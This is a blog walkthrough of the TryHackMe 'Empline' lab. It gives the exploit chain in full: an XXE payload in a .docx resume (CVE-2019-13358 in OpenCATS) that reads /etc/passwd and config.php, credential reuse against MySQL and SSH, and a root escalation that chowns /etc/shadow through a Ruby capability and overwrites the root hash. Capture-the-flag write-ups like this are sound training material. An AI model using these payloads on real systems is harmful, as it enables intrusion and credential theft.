---
title: Try Hack Me Empline
date: 2021-09-19T13:14:49+05:30
lastmod: 2021-09-19T13:14:49+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/empline.png
  alt: "cover image"
simg: /img/empline.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm

draft: false
description: TryHackMe Room {Empline} solved by Animesh Roy. this is a walkthough. read more...

---

## OverView

|||
|---|---|
| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|Empline|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/189112ffef41c0fa813d7d5b394a58b5.png)|
| <b> Empline [Subscription Required] </b>| [Empline](https://tryhackme.com/room/empline)|

Are you good enough to apply for this job?

## Enumeration

### Nmap

```bash
sudo nmap -sC -sV -oN nmap/init 10.10.127.35
[sudo] password for anir0y: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-19 13:18 IST
Nmap scan report for 10.10.127.35
Host is up (0.21s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA)
|   256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA)
|_  256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Empline
3306/tcp open  mysql   MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 86
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, IgnoreSigpipes, Speaks41ProtocolOld, SupportsTransactions, SupportsCompression, FoundRows, InteractiveClient, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, ODBCClient, LongPassword, ConnectWithDatabase, SupportsLoadDataLocal, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommi
|   Salt: N|F*;+c3re'0ZUy#?Sd'|
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.67 seconds
```

|Port|service|remarks
|---|---|---|
|22|SSH|will check this one later|
|80|HTTP| web-service|
|3306|MySQL| kinda odd, usually MySQL port/services aren't exposed on external IP|

### HTTP Enumeration

#### port:80

![img](https://i.imgur.com/5JIXGQa.png)

nothing important. gobuster returns no `intresting` results.

![img](https://i.imgur.com/5M4xfrp.png)

one new `sub-domain` linked with `Employment` menu. let's add that to our local `/etc/hosts` file.

#### job.empline.thm

![img](https://i.imgur.com/GHRimOl.png)

* CMS is `opencats`
* Version 0.9.4 Countach
* A vulnerabilty `CVE-2019-13358` can be exploited.
* ref to original [blog post](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/)

## Payload

### XXE on job.empline.thm

* generate the document file:

     ```python
     #!/usr/bin/env python3
     from docx import Document
     document = Document()
     paragraph = document.add_paragraph('anir0y')
     document.save('payload.docx')
     ```

* unzip the document file and add the payload to read `/etc/passwd` file.

     ```xml
     <!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
     ```

* For the second modification, we need to find and change my name(`anir0y`) which was the only content that was in the resume. We will swap out my name with this:

     `&test;`

* goto the URL: `job.empline.thm/careers/` and apply for the job with our `payload.docx` as resume.
* it worked!!!
  
     ![img](https://i.imgur.com/w4mSOfH.png)

* now let's try reading the `config.php` on root dir.

     ```xml
     <?xml version='1.0' encoding='UTF-8' standalone='yes'?>
     <!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=config.php'>]>
     <w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:mo="http://schemas.microsoft.com/office/mac/office/2008/main" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:mv="urn:schemas-microsoft-com:mac:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 wp14"><w:body><w:p><w:r><w:t>&test;</w:t></w:r></w:p><w:sectPr w:rsidR="00FC693F" w:rsidRPr="0006063C" w:rsidSect="00034616"><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:top="1440" w:right="1800" w:bottom="1440" w:left="1800" w:header="720" w:footer="720" w:gutter="0"/><w:cols w:space="720"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body></w:document>
     ```

* save it to the `payload.docx`

     ```bash
     ┌──(anir0y㉿kali)-[~/…/thm/room/empline/xxe]
     └─$ zip payload.docx word/document.xml 
     updating: word/document.xml (deflated 65%)
     ```

* reupload the file.
  
  ![img](https://i.imgur.com/D69DfgA.png)

* save the encoded output to a file and decode it with base64 decoder. you can find the  `DB creds`. as we already know `mysql` is listening on IP. let's try connecting with it.

> PS: I did try the creds for SSH; didn't worked!! :(

### MySQL

* login to remote db
  
  ![img](https://i.imgur.com/38Ccqil.png)

* found user creds:
  
  ![img](https://i.imgur.com/CePlnsF.png)

* let's crack the hash.
  
     ![img](https://i.imgur.com/kM5HkTC.png)

only password I was able to crack with `rockyou.txt` is for `george`

## User.txt

* now we have creds for `george`; SSH into the machine with his creds.
* the creds worked!!! 
* now we can read `user.txt` file.
  
  ![img](https://i.imgur.com/buJSaNJ.png)

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## root.txt

* let's run `linpeas`
* intresting finding for `Capabilities`
  
  `/usr/local/bin/ruby = cap_chown+ep`

* take ownership of `/etc/shadow` file
  
  `ruby -e 'File.chown(1002,1002,"/etc/shadow")'`

* change root password

     ```python
     python -c "import crypt, getpass, pwd; \
          print crypt.crypt('password', '\$6\$SALTsalt\$')"
     ```

     ```bash
     edit /etc/shadow with new generated hash
     # before
     root:$6$1cvOcl49$/czKHKvBaz450J3YnIvkqexT.StvdgUWzPr5X1Aitt/kxgF/i78wziX3zJQ0y8Kg9y749Qjr5EFiHmTdPsIJH/:18828:0:99999:7:::
     #now
     root:$6$SALTsalt$UiZikbV3VeeBPsg8./Q5DAfq9aj7CVZMDU6ffBiBLgUEpxv7LMXKbcZ9JSZnYDrZQftdG319XkbLVMvWcF/Vr/:18828:0:99999:7:::
     ```

* finally we can read the `root.txt` flag.

     ![img](https://i.imgur.com/7uyiAp5.png)

---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>

<!-- END -->

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
